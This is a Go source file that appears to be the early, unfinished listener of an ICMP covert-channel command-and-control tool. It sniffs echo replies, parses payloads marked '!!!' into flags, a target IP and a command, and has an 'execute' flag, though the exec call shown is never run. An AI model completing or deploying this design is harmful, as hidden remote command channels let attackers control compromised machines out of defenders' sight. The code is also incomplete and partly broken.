package main

import (
	"bytes"
	"fmt"
	"log"
	"os/exec"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/icmp"
)

var DEBUG bool = true

var id int = 0
var clients = make(map[int]string)
var SSM bool = true
var execute = false
var PACKETQUEUE []icmp.Message
var KEY rune = 'B'

var (
	buffer = int32(1600)
	filter = "icmp[icmptype] == icmp-echoreply"
)

const (
	ProtocolICMP = 1
)

func convert(nums []byte) string {
	var converted string
	converted = bytes.NewBuffer(nums).String()
	return converted
}

func SetFlags(header string) {
	if header[3] == '1' {
		SSM = true
	} else {
		SSM = false
	}
	if header[4] == '1' {
		execute = true
	} else {
		execute = false
	}
}

func sniffer() {
	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()
	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}
	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		payload := convert(packet.ApplicationLayer().Payload())
		if strings.HasPrefix(payload, "!!!") {
			parts := strings.Split(payload, "[")

			// get the part before "["
			header := parts[0]

			// get the part after "["
			AfterHeader := parts[1]

			// split the string by "]"
			parts = strings.Split(AfterHeader, "]")

			// get the part before "]"
			ip := parts[0]

			fmt.Println("Header:", header)
			fmt.Println("IP:", ip)
			fmt.Println("Command:", parts[1])
			SetFlags(header)
			exec.Command("ping")
		} else {
			continue
		}
	}
}

func main() {
	go sniffer()
	for true {
		continue
	}
}
